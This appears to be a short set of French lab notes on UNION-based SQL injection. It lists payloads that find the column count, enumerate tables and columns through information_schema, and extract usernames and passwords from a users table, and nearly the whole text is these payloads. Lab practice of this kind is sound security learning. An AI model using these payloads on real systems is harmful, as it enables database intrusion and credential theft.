
![](Pasted%20image%2020260722160737.png)

on va determiner le nombre de columns qu'il a ainsi que les tables qu'il a 

'+ORDER+BY+1--
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--
'+UNION+SELECT+NULL,table_name+FROM+information_schema.tables--
![](Pasted%20image%2020260722160742.png)
![](Pasted%20image%2020260722160747.png)
maintenant on va chercher les tables qui peuvent posséder les crédentials :
- pg_user
- users
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name = 'users'--
'+UNION+SELECT+NULL,column_name+FROM+information_schema.columns+WHERE+table_name = 'users'--
![](Pasted%20image%2020260722160755.png)
maintenant on va afficher la password et l'username dans une certaines syntaxe :

`' UNION SELECT username || '~' || password FROM users--`
'+UNION+SELECT+username+||+'~'+||+password,NULL+FROM+users--
'+UNION+SELECT+NULL,username+||+'~'+||+password+FROM+users--
![](Pasted%20image%2020260722160804.png)

![](Pasted%20image%2020260722160811.png)
